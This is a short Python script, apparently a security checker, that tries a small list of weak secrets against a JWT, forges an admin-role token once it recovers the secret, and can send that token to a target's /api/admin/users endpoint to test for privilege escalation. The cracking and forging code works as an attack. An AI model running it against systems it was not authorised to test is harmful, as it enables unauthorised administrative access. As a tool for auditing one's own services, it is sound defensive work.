#!/usr/bin/env python3
import argparse
import base64
import json
import sys

import jwt
import requests


WEAK_SECRETS = ["secret", "password", "admin", "changeme", "jwtsecret", "dev", "test"]


def decode_segment(segment):
    padded = segment + "=" * (-len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(padded.encode()))


def main():
    parser = argparse.ArgumentParser(description="JWT weak secret and role tamper demo checker.")
    parser.add_argument("token", help="JWT value, without Bearer prefix")
    parser.add_argument("--base-url", help="Optional target URL to test tampered role against /api/admin/users")
    args = parser.parse_args()

    parts = args.token.split(".")
    if len(parts) != 3:
        print("FAIL: Token is not a standard JWT.")
        return 2

    header = decode_segment(parts[0])
    payload = decode_segment(parts[1])
    print(f"INFO: alg={header.get('alg')} sub={payload.get('sub')} role={payload.get('role')}")

    found_secret = None
    for secret in WEAK_SECRETS:
        try:
            jwt.decode(args.token, secret, algorithms=[header.get("alg", "HS256")])
            found_secret = secret
            break
        except jwt.PyJWTError:
            continue

    if not found_secret:
        print("PASS: Token was not signed with the small demo weak-secret list.")
        return 0

    print(f"FAIL: JWT signed with weak secret: {found_secret!r}")
    tampered = payload.copy()
    tampered["role"] = "admin"
    forged = jwt.encode(tampered, found_secret, algorithm=header.get("alg", "HS256"))
    print("INFO: Forged admin-role token was created using the recovered weak secret.")

    if args.base_url:
        resp = requests.get(
            f"{args.base_url.rstrip('/')}/api/admin/users",
            headers={"Authorization": f"Bearer {forged}"},
            timeout=10,
        )
        if resp.status_code == 200:
            print("FAIL: Forged admin token was accepted by /api/admin/users.")
        else:
            print(f"PASS: Forged admin token was rejected. HTTP {resp.status_code}.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
